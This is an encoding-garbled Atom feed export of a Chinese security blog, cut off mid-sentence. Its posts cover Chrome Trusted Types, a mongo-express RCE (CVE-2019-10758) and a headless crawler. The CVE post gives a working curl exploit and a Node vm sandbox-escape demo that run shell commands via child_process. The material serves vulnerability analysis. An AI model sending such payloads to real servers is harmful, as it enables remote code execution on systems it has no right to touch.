    <content type="html"><![CDATA[<hr><a id="more"></a><p>æ–‡ç« é¦–å‘<a href="https://xz.aliyun.com/t/7108" target="_blank" rel="noopener">å…ˆçŸ¥ç¤¾åŒº</a></p><p>ä¹‹å‰è¢«é—®åˆ°è¿™æ ·ä¸€ä¸ªæœ‰æ„æ€çš„é—®é¢˜ï¼Œä¸ºä»€ä¹ˆæ–°ç‰ˆChromeå–æ¶ˆäº†XSS Auditæœºåˆ¶ï¼Ÿ</p><p>ä»¥å‰<a href="https://zhuanlan.zhihu.com/p/74288648" target="_blank" rel="noopener">çœ‹åˆ°è¿‡æ–‡ç« </a>è¯´æ–°ç‰ˆChromeå–æ¶ˆè¿™ä¸ªçš„åŸå› æ˜¯å› ä¸ºè¢«ç»•è¿‡çš„å§¿åŠ¿è¿‡å¤š(æˆ‘ä¹Ÿä¸çŸ¥é“å‡ ä¸ª)æˆ–è€…è¯´æ˜¯è¯¯æŠ¥å½±å“åˆ°æ­£å¸¸åŠŸèƒ½äº†ã€‚å¹¶è¯´ç”¨<code>trusted-types</code>çš„APIæ›¿æ¢<code>XSS Audit</code>èƒ½å½»åº•æœç»<code>DOM XSS</code>ã€‚</p><p>ä»”ç»†è·Ÿäº†ä¸€ä¸‹<a href="https://developers.google.com/web/updates/2019/02/trusted-types" target="_blank" rel="noopener">è°·æ­Œçš„å¼€å‘æ–‡æ¡£ä»‹ç»</a>ï¼Œé€šè¿‡ç»™CSPé…ç½®ä¸€ä¸ª<code>trusted-types</code>å±æ€§ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: trusted-types *</span><br></pre></td></tr></table></figure></p><p>æœ¬åœ°æµ‹è¯•79.0ç‰ˆæœ¬ï¼š<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Content-Security-Policy: trusted-types *"</span>);</span><br><span class="line">$a= <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line"><span class="string">const templateId = location.hash.match(/tplid=([^;&amp;]*)/)[1];</span></span><br><span class="line"><span class="string">// typeof templateId == "string"</span></span><br><span class="line"><span class="string">document.head.innerHTML += decodeURI(templateId) // Throws a TypeError.</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line"><span class="keyword">echo</span> $a;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2020/01/14/BpweX4RQ1CZAW3g.jpg" alt="-w1031"></p><p>ä½†æ˜¯å¹¶æ²¡æœ‰æŠ›å‡ºé”™è¯¯ï¼Œç»§ç»­ç¿»äº†ä¸‹æ–‡æ¡£ï¼Œæ‰¾åˆ°é—®é¢˜æ‰€åœ¨:<br><img src="https://i.loli.net/2020/01/14/noSBxectQUGKXjp.jpg" alt="-w1022"><br>éœ€è¦ç”¨Chrome73-78çš„ç‰ˆæœ¬ï¼Œå…¶æ¬¡é»˜è®¤é…ç½®æ˜¯ä¸å¼€çš„ï¼Œè®¿é—®<code>chrome://flags/#enable-experimental-web-platform-features</code>å°†å…¶é…ç½®æ‰“å¼€ã€‚</p><p>è¿™é‡Œç”¨Chrome78æµ‹è¯•ï¼š<br><img src="https://i.loli.net/2020/01/14/XVCrkMn9Sjt5hqw.jpg" alt="-w838"></p><p><img src="https://i.loli.net/2020/01/14/KblJWSctxfqOByX.jpg" alt="-w1258"></p><p>æŠ›å‡ºä¸€ä¸ªé”™è¯¯ï¼Œå¼ºåˆ¶è¦æ±‚æˆ‘ä»¬ä½¿ç”¨<code>TrustedHTML</code>ï¼Œä¿®æ”¹ä»£ç ï¼š<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Content-Security-Policy: trusted-types *"</span>);</span><br><span class="line">$a= <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line"><span class="string">const templatePolicy = TrustedTypes.createPolicy('template', &#123;</span></span><br><span class="line"><span class="string">    createHTML: (templateId) =&gt; &#123;</span></span><br><span class="line"><span class="string">      const tpl = templateId;</span></span><br><span class="line"><span class="string">      if (/^[0-9a-z-]$/.test(tpl)) &#123;</span></span><br><span class="line"><span class="string">        return `&lt;link rel="stylesheet" href="./templates/\$&#123;tpl&#125;/style.css"&gt;`;</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">      throw new TypeError();</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">  &#125;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">const html = templatePolicy.createHTML(location.hash.match(/tplid=([^;&amp;]*)/)[1]);</span></span><br><span class="line"><span class="string">// html instanceof TrustedHTML</span></span><br><span class="line"><span class="string">document.head.innerHTML = html;</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line"><span class="keyword">echo</span> $a;</span><br></pre></td></tr></table></figure></p><p>é€šè¿‡<code>TrustedTypes.createPolicy</code>è‡ªå®šä¹‰è¿‡æ»¤åï¼Œreturnä¸€ä¸ª<code>TrustedHTML</code>æ¥æ»¡è¶³CSPçš„å¯ä¿¡è¦æ±‚ï¼š<br><img src="https://i.loli.net/2020/01/15/bt3xTEq5dGWmU8N.jpg" alt="-w1015"></p><h2 id="æœ€å"><a href="#æœ€å" class="headerlink" title="æœ€å"></a>æœ€å</h2><p>åœ¨Chrome79ä¸‹,å³ä½¿æˆ‘ä»¬å¼€å¯äº†<code>Experimental Web Platform features</code>è¿™ä¸ªé…ç½®ï¼Œä»ç„¶ä¼šé‡åˆ°<code>TrustedTypes is not defined</code>çš„é—®é¢˜ï¼Œemmå¯èƒ½åŠŸèƒ½æ­£åœ¨è¯•éªŒä¸­ï¼Œç„¶åæ–°ç‰ˆåˆç»™ç§»é™¤äº†ï¼Ÿ<br><img src="https://i.loli.net/2020/01/14/chTDAemO3dyiVjP.jpg" alt="-w1046"></p><p>å…¶æ¬¡å› ä¸ºè¿™ä¸ªé—®é¢˜æµ‹è¯•çš„æ—¶å€™ï¼ŒChromeä¼šé»˜è®¤æ›´æ–°åˆ°79ç‰ˆæœ¬æœ‰ç‚¹çƒ¦ï¼Œå»<a href="https://www.chromedownloads.net/chrome64win/" target="_blank" rel="noopener">è¿™é‡Œ</a>ï¼Œæ‰¾äº†ä¸ª78ç‰ˆæœ¬çš„ä¸‹è½½ï¼Œæ¥ç€è¾“<code>msconfig</code>æŠŠè°·æ­ŒæœåŠ¡çš„æ›´æ–°å…³äº†å³å¯<br><img src="https://i.loli.net/2020/01/14/PRvEKkwYAepyD75.jpg" alt="-w1136"><br>æœ€åæ‰“å¼€Chromeæ•ˆæœæ˜¯è¿™æ ·çš„ï¼š<br><img src="https://i.loli.net/2020/01/14/UIfsWblVG7FQO6T.jpg" alt="-w730"></p><p>æœ€åç®€å•æ€»ç»“ä¸€ä¸‹ï¼ŒChromeå–æ¶ˆäº†XSS Auditorï¼Œå–è€Œä»£ä¹‹çš„æ˜¯<code>trusted-types</code>å¯ä¿¡APIï¼Œå£°ç§°å¯ä»¥å½»åº•æœç»DOM XSSï¼Œç»è¿‡ä¸€ç•ªä½“éªŒåï¼Œå…¶å®æœ¬è´¨ä¸Šä¸ºå¼ºåˆ¶å¼€å‘å†™ä¸€æ®µæ›´ä¸ºä¸¥æ ¼çš„è¿‡æ»¤è§„åˆ™ã€‚</p><p>æ‹­ç›®ä»¥å¾…ï¼Œçœ‹çœ‹ä¹‹åè°·æ­Œæœ‰ä»€ä¹ˆæ–°çš„æƒ³æ³•~</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="Web" scheme="https://0day.design/categories/Web/"/>
    
    
      <category term="å‰ç«¯å®‰å…¨" scheme="https://0day.design/tags/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-10758 mongo-express RCEå¤ç°åˆ†æ</title>
    <link href="https://0day.design/2020/01/08/CVE-2019-10758%E5%A4%8D%E7%8E%B0/"/>
    <id>https://0day.design/2020/01/08/CVE-2019-10758å¤ç°/</id>
    <published>2020-01-08T09:26:00.000Z</published>
    <updated>2020-03-19T12:47:56.505Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h2 id="å¤ç°è¿‡ç¨‹"><a href="#å¤ç°è¿‡ç¨‹" class="headerlink" title="å¤ç°è¿‡ç¨‹"></a>å¤ç°è¿‡ç¨‹</h2><p>æ‹‰ä¸€ä¸ªMongoDBçš„dockeré•œåƒï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -p 27017:27017 -d mongo</span><br></pre></td></tr></table></figure></p><p>æœ¬åœ°<code>npm init</code>åˆ›å»ºä¸ª<code>package.json</code>ï¼Œæ¥ç€æ·»åŠ ä¾èµ–åº“<a href="mailto:`mongo-express@0.53.0" target="_blank" rel="noopener">`mongo-express@0.53.0</a><code>,</code>npm install`å®‰è£…<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;dependencies&quot;: &#123;</span><br><span class="line">  &quot;mongo-express&quot;: &quot;0.53.0&quot;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure></p><p>EXP:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl &apos;https://localhost:8081/checkValid&apos; -H &apos;Authorization: Basic YWRtaW46cGFzcw==&apos;  --data &apos;document=this.constructor.constructor(&quot;return process&quot;)().mainModule.require(&quot;child_process&quot;).execSync(&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;)&apos;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2020/01/08/IdKYBmSTFE2wXjo.jpg" alt="-w1093"></p><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>å…ˆæ¥çœ‹çœ‹<code>checkValid</code>è¿™ä¸ªè·¯ç”±ï¼šlib/router.js#279è¡Œ<br><img src="https://i.loli.net/2020/01/08/GPdTktMignySW7b.jpg" alt="-w1092"></p><p>è·Ÿè¿›<code>checkValid</code>å‡½æ•°ï¼šlib/routes/document.js#28<br><img src="https://i.loli.net/2020/01/08/pNMWhLa23QjFBiR.jpg" alt="-w1074"></p><p>è·å–postçš„çš„<code>doc</code>å‚æ•°ï¼Œä½¿ç”¨bsonåº“è¿›è¡ŒBSONæ•°æ®è½¬æ¢ã€‚</p><blockquote><p>BSONæ˜¯ä¸€ç§è®¡ç®—æœºæ•°æ®äº¤æ¢æ ¼å¼ï¼Œä¸»è¦è¢«ç”¨ä½œMongoDBæ•°æ®åº“ä¸­çš„æ•°æ®å­˜å‚¨å’Œç½‘ç»œä¼ è¾“æ ¼å¼ã€‚å®ƒæ˜¯ä¸€ç§äºŒè¿›åˆ¶è¡¨ç¤ºå½¢å¼ï¼Œèƒ½ç”¨æ¥è¡¨ç¤ºç®€å•æ•°æ®ç»“æ„ã€å…³è”æ•°ç»„ï¼ˆMongoDBä¸­ç§°ä¸ºâ€œå¯¹è±¡â€æˆ–â€œæ–‡æ¡£â€ï¼‰ä»¥åŠMongoDBä¸­çš„å„ç§æ•°æ®ç±»å‹ã€‚BSONä¹‹åç¼˜äºJSONï¼Œå«ä¹‰ä¸ºBinary JSONï¼ˆäºŒè¿›åˆ¶JSONï¼‰</p></blockquote><p>è·Ÿè¿›toBSONå‡½æ•°ï¼šlib/bson.js#54<br><img src="https://i.loli.net/2020/01/08/JdDlmgjT7A8cq3M.jpg" alt="-w1471"><br>åœ¨ç¬¬60è¡Œè¿›å…¥vmæ²™ç®±evalæ“ä½œã€‚</p><p>ä½¿ç”¨<code>this.constructor.constructor</code>é€ƒé€¸æ²™ç®±ï¼Œå‚è€ƒ<a href="https://xz.aliyun.com/t/7056" target="_blank" rel="noopener">https://pwnisher.gitlab.io/nodejs/sandbox/2019/02/21/sandboxing-nodejs-is-hard.html</a>ï¼Œä½¿ç”¨<code>this</code>æŒ‡å‘VMå®¹å™¨å¤–ï¼Œä½¿ç”¨<code>.constructor</code>æŒ‡å‘æ„é€ å™¨ï¼Œè®¿é—®æ„é€ å™¨çš„æ„é€ å™¨å¯¹è±¡ï¼Œåˆ›å»ºä¸€ä¸ªæ„é€ å‡½æ•°ã€‚</p><p>demo:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">"use strict"</span>;</span><br><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">"vm"</span>);</span><br><span class="line"><span class="keyword">const</span> xyz = vm.runInNewContext(<span class="string">`const process = this.constructor.constructor('return this.process')();</span></span><br><span class="line"><span class="string">process.mainModule.require('child_process').execSync('/Applications/Calculator.app/Contents/MacOS/Calculator').toString()`</span>);</span><br><span class="line"><span class="built_in">console</span>.log(xyz);</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2020/01/08/4XVZOl1FQnp9SvB.jpg" alt="-w1148"></p><h2 id="ä¿®å¤"><a href="#ä¿®å¤" class="headerlink" title="ä¿®å¤"></a>ä¿®å¤</h2><p>å®˜æ–¹ä¿®å¤åˆ é™¤äº†vmåº“çš„å¼•ç”¨ï¼š<a href="https://github.com/mongo-express/mongo-express/commit/d8c9bda46a204ecba1d35558452685cd0674e6f2" target="_blank" rel="noopener">https://github.com/mongo-express/mongo-express/commit/d8c9bda46a204ecba1d35558452685cd0674e6f2</a><br><img src="https://i.loli.net/2020/01/08/HlCbfEqkNW2VOvR.jpg" alt="-w1030"></p><p>å‚è€ƒï¼š</p><ul><li><a href="https://xz.aliyun.com/t/7056" target="_blank" rel="noopener">CVE-2019-10758:mongo-expressRCEå¤ç°åˆ†æ</a></li><li><a href="https://github.com/masahiro331/CVE-2019-10758" target="_blank" rel="noopener">CVE-2019-10758 POC</a></li><li><a href="https://pwnisher.gitlab.io/nodejs/sandbox/2019/02/21/sandboxing-nodejs-is-hard.html" target="_blank" rel="noopener">Sandboxing NodeJS is hard, here is why</a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function</a></li><li><a href="https://dfkaye.github.io/2014/03/14/javascript-eval-and-function-constructor/" target="_blank" rel="noopener">https://dfkaye.github.io/2014/03/14/javascript-eval-and-function-constructor/</a></li><li><a href="https://github.com/i0natan/nodebestpractices/issues/211" target="_blank" rel="noopener">https://github.com/i0natan/nodebestpractices/issues/211</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
    
      <category term="æ¼æ´åˆ†æ" scheme="https://0day.design/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="Web" scheme="https://0day.design/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>NodeJS Headless åŠ¨æ€æ¼æ‰«çˆ¬è™«å­¦ä¹ è®°å½•(çˆ¬è™«ç¯‡)</title>
    <link href="https://0day.design/2020/01/08/NodeJS%20Headless%20%E5%8A%A8%E6%80%81%E6%BC%8F%E6%89%AB%E7%88%AC%E8%99%AB%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95(%E7%88%AC%E8%99%AB%E7%AF%87)/"/>
    <id>https://0day.design/2020/01/08/NodeJS Headless åŠ¨æ€æ¼æ‰«çˆ¬è™«å­¦ä¹ è®°å½•(çˆ¬è™«ç¯‡)/</id>
    <published>2020-01-08T05:20:00.000Z</published>
    <updated>2020-03-19T12:47:56.505Z</updated>
    
    <content type="html"><![CDATA[<p>æ–‡ç« é¦–å‘å…ˆçŸ¥ç¤¾åŒºï¼š<a href="https://xz.aliyun.com/t/7064" target="_blank" rel="noopener">https://xz.aliyun.com/t/7064</a>  </p><p>åœ¨ä¸¤å¹´å‰è°·æ­Œæ¨å‡ºäº†ä¸€ä¸ªHeadless Chrome NodeJS API:<a href="https://github.com/puppeteer/puppeteer" target="_blank" rel="noopener">Puppeteer</a>ï¼Œåæ¥Githubä¸€ä¸ªå¤§ç‰›ç”¨Pythonå°è£…äº†ä¸€å¥—apiï¼Œä½œä¸ºä¸€ä¸ªç¬¬ä¸‰æ–¹api:<a href="https://github.com/miyakogi/pyppeteer" target="_blank" rel="noopener">Pyppeteer</a>ã€‚</p><p>åœ¨å»å¹´çš„æ—¶å€™ï¼Œå°è¯•è¿‡ç”¨Pyppeteerå†™è¿‡åŠ¨æ€çˆ¬è™«ï¼ŒPythonç‰ˆç”±äºæ˜¯ç¬¬ä¸‰æ–¹ä¸€ä¸ªä½œè€…å°è£…çš„ï¼Œæ›´æ–°å¾ˆæ…¢ï¼Œè½åå®˜æ–¹ç‰ˆæœ¬å¾ˆå¤šï¼Œå¾ˆå¤šè¿·ä¹‹BUGï¼Œæ¯”å¦‚CDPåè®®å»æ“ä½œè¿œç¨‹chromiumï¼Œå¾ˆå®¹æ˜“ä¸­æ–­å¯¼è‡´ä¸€å †åƒµå°¸è¿›ç¨‹çš„chromiumå…³ä¸æ‰ã€‚è™½ç„¶æœ€åè¿˜æ˜¯é¡¶ç€å„ç§bugï¼Œå†™æˆä¸€ä¸ªå‹‰å¼ºèƒ½ç”¨çš„å·¥å…·ï¼Œä½†åœ¨æœåŠ¡å™¨ä¸Šå¾ˆåƒå†…å­˜ï¼Œä¸€æ–¹é¢ä¹Ÿæ˜¯å› ä¸ºå†™çš„ä»»åŠ¡è°ƒåº¦æœºåˆ¶ä¹Ÿæœ‰ä¸€äº›é—®é¢˜ï¼Œæœ€åæœå½¹äº†è®¸å¤šå¤©å¤©ï¼Œä¸æƒ³ç»´æŠ¤äº†ï¼Œæ¡äº†å‡ ä¸ªæ¼æ´å°±é€€ä¼‘äº†ã€‚åæ¥åœ¨å¹³æ—¶çš„å·¥ä½œå’Œå­¦ä¹ ä¸­é¢‘é¢‘æ¥è§¦åˆ°nodeJSï¼Œäºæ˜¯å°±è¶ç€è¿™æ®µæ—¶é—´ç”¨nodejsé‡æ–°å®ç°ä¸€éã€‚<br><a id="more"></a></p><h2 id="JSåŸºç¡€"><a href="#JSåŸºç¡€" class="headerlink" title="JSåŸºç¡€"></a>JSåŸºç¡€</h2><h3 id="JSä¸­çš„äº‹ä»¶æ¨¡å‹"><a href="#JSä¸­çš„äº‹ä»¶æ¨¡å‹" class="headerlink" title="JSä¸­çš„äº‹ä»¶æ¨¡å‹"></a>JSä¸­çš„äº‹ä»¶æ¨¡å‹</h3><p>åˆ†ä¸ºï¼šå†…è”ã€DOM0çº§ã€DOM2çº§äº‹ä»¶<br><img src="https://i.loli.net/2020/01/05/KHqkNfO5GUPtCYd.jpg" alt="-w1016"></p><h3 id="JSåŸå‹é“¾ä»‹ç»"><a href="#JSåŸå‹é“¾ä»‹ç»" class="headerlink" title="JSåŸå‹é“¾ä»‹ç»"></a>JSåŸå‹é“¾ä»‹ç»</h3><p>Jsæ˜¯ä¸€ç§åŸºäºåŸå‹çš„è¯­è¨€ï¼Œæ¯ä¸€ä¸ªå¯¹è±¡éƒ½æœ‰ä¸€ä¸ªåŸå‹å¯¹è±¡ï¼Œå¯¹è±¡ä»¥å…¶åŸå‹ä¸ºæ¨¡æ¿ã€ä»åŸå‹ç»§æ‰¿æ–¹æ³•å’Œå±æ€§ã€‚åŸå‹å¯¹è±¡ä¹Ÿå¯èƒ½æ‹¥æœ‰åŸå‹ï¼Œä¸€å±‚ä¸€å±‚ã€ä»¥æ­¤ç±»æ¨ã€‚<br>åœ¨ä¼ ç»Ÿçš„é¢å‘å¯¹è±¡ç¼–ç¨‹ä¸­ï¼Œæˆ‘ä»¬é¦–å…ˆä¼šå®šä¹‰â€œç±»â€ï¼Œæ­¤ååˆ›å»ºå¯¹è±¡å®ä¾‹æ—¶ï¼Œç±»ä¸­å®šä¹‰çš„æ‰€æœ‰å±æ€§å’Œæ–¹æ³•éƒ½è¢«å¤åˆ¶åˆ°å®ä¾‹ä¸­ã€‚ä½†åœ¨ js ä¸­å¹¶ä¸æ˜¯åƒè¿™æ ·å¤åˆ¶ï¼Œè€Œæ˜¯åœ¨å¯¹è±¡å®ä¾‹å’Œç±»ä¹‹é—´ä¹‹é—´å»ºç«‹ä¸€ä¸ªé“¾æ¥ã€‚<br>demo:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Cat</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.color = <span class="string">'test'</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> cat = <span class="keyword">new</span> Cat()</span><br><span class="line"><span class="built_in">console</span>.log(cat.__proto__ === Cat.prototype)   <span class="comment">// true</span></span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2020/01/05/hANutc8Tlp4oaMK.jpg" alt="-w909"><br>åœ¨ JavaScript ä¸­ï¼Œå¦‚æœæƒ³è®¿é—®æŸä¸ªå±æ€§ï¼Œé¦–å…ˆä¼šåœ¨å®ä¾‹å¯¹è±¡ï¼ˆcatï¼‰çš„å†…éƒ¨å¯»æ‰¾ï¼Œå¦‚æœæ²¡æ‰¾åˆ°ï¼Œå°±ä¼šåœ¨è¯¥å¯¹è±¡çš„åŸå‹ï¼ˆ<code>cat._proto_</code>ï¼Œå³ <code>Cat.prototype</code>ï¼‰ä¸Šæ‰¾ï¼Œæˆ‘ä»¬çŸ¥é“ï¼Œå¯¹è±¡çš„åŸå‹ä¹Ÿæ˜¯å¯¹è±¡ï¼Œå®ƒä¹Ÿæœ‰åŸå‹ï¼Œå¦‚æœåœ¨å¯¹è±¡çš„åŸå‹ä¸Šä¹Ÿæ²¡æœ‰æ‰¾åˆ°ç›®æ ‡å±æ€§ï¼Œåˆ™ä¼šåœ¨å¯¹è±¡çš„åŸå‹çš„åŸå‹ï¼ˆ<code>Cat.prototype._proto_</code>ï¼‰ä¸Šå¯»æ‰¾ï¼Œä»¥æ­¤å†…æ¨ï¼Œç›´åˆ°æ‰¾åˆ°è¿™ä¸ªå±æ€§æˆ–è€…åˆ°è¾¾äº†æœ€é¡¶å±‚ã€‚åœ¨åŸå‹ä¸Šä¸€å±‚ä¸€å±‚å¯»æ‰¾ï¼Œè¿™ä¾¿æ˜¯åŸå‹é“¾äº†ã€‚</p><h2 id="å¦‚ä½•æŠ“å–æ›´å¤šçš„URL"><a href="#å¦‚ä½•æŠ“å–æ›´å¤šçš„URL" class="headerlink" title="å¦‚ä½•æŠ“å–æ›´å¤šçš„URL"></a>å¦‚ä½•æŠ“å–æ›´å¤šçš„URL</h2><p>å‡ ç§æ€è·¯ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨æ­£åˆ™æŠ“å–ï¼Œä¹Ÿå¯ä»¥è§£æå„ç§å«æœ‰é“¾æ¥çš„æ ‡ç­¾ï¼Œä¹Ÿå°±æ˜¯src,hrefå±æ€§ç­‰ã€‚<br>å½“ç„¶è¿™äº›éƒ½æœ‰ä¸€å®šçš„ç¼ºé™·ï¼Œæ¯”å¦‚ç›¸å¯¹è·¯å¾„éœ€è¦å•ç‹¬å»å¤„ç†æˆå®Œæ•´URlï¼Œæœ‰çš„ä½¿ç”¨çš„jsè·³è½¬ï¼Œè€Œä¸æŠŠURlå†™åˆ°æ ‡ç­¾å†…ç­‰ç­‰ã€‚å¦ä¸€ç§æ€è·¯å³ä½¿ç”¨åŠ¨æ€çˆ¬è™«çš„æ€è·¯ï¼ŒHook JSï¼Œé€šè¿‡è§¦å‘å„ç§äº‹ä»¶ä¿¡æ¯æ”¶é›†URLã€‚è¿™é‡Œè®¡åˆ’ç¬¬ä¸€ç‰ˆçˆ¬è™«å…ˆå®ç°ç®€æ˜“çš„URLæŠ“å–ï¼Œä¹‹åå†è¿›ä¸€æ­¥ä¼˜åŒ–ã€‚é¦–å…ˆæœ€å¸¸æƒ³åˆ°çš„æ˜¯ä½¿ç”¨æ­£åˆ™æŠ“å–ï¼Œå…¶æ¬¡å¯ä»¥åˆ©ç”¨Headlessçš„ä¼˜åŠ¿ï¼Œå°†åŠ¨æ€JSæ¸²æŸ“çš„é“¾æ¥æ ‡ç­¾ã€å±æ€§æŠ“å–ã€‚</p><h3 id="æ”¶é›†srcã€hrefå±æ€§çš„æ ‡ç­¾"><a href="#æ”¶é›†srcã€hrefå±æ€§çš„æ ‡ç­¾" class="headerlink" title="æ”¶é›†srcã€hrefå±æ€§çš„æ ‡ç­¾"></a>æ”¶é›†srcã€hrefå±æ€§çš„æ ‡ç­¾</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">function getSrcAndHrefLinks(nodes) &#123;</span><br><span class="line">    let result = [];</span><br><span class="line">    for(let node of nodes)&#123;</span><br><span class="line">        let src = node.getAttribute(&quot;src&quot;);</span><br><span class="line">        let href = node.getAttribute(&quot;href&quot;);</span><br><span class="line">        let action = node.getAttribute(&quot;action&quot;);</span><br><span class="line">        if (src)&#123;</span><br><span class="line">            result.push(src)</span><br><span class="line">        &#125;</span><br><span class="line">        if (href)&#123;</span><br><span class="line">            result.push(href);</span><br><span class="line">        &#125;</span><br><span class="line">        if(action)&#123;</span><br><span class="line">            result.push(action);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return result;</span><br><span class="line">&#125;</span><br><span class="line">const links = await page.$$eval(&apos;[src],[href],[action]&apos;, getSrcAndHrefLinks);</span><br></pre></td></tr></table></figure><p>çˆ¬è¡Œç»“æœï¼š<br><img src="https://i.loli.net/2020/01/05/LskpidD2mlUJOIo.jpg" alt="-w1366"></p><p>æ¥ç€é€šè¿‡ç®€å•çš„URLå»é‡ã€æ¸…æ´—ï¼Œçˆ¬è™«ä¾¿å¯ä»¥è¿›è¡Œè¿­ä»£çˆ¬è¡Œäº†ã€‚</p><p>ç»è¿‡ä¸€ç•ªæµ‹è¯•åå‘ç°ï¼Œå¯¹äºä¸‹é¢è¿™ç§é¡µé¢URLæŠ“å–æ˜¯ä¼šæœ‰é—æ¼çš„ï¼š<br><img src="https://i.loli.net/2020/01/05/eA9Uh6RJVyxTq7Q.jpg" alt="-w1547"></p><p>æœ‰çš„å°†è·³è½¬æ“ä½œå…¨å†™å…¥äº†jsäº‹ä»¶ä¸­ï¼Œæˆ–è€…æœ‰çš„è¦è¿›è¡Œé¡µé¢æ»šåŠ¨JSæ‰ä¼šè¿›ä¸€æ­¥æ¸²æŸ“ï¼Œæ— 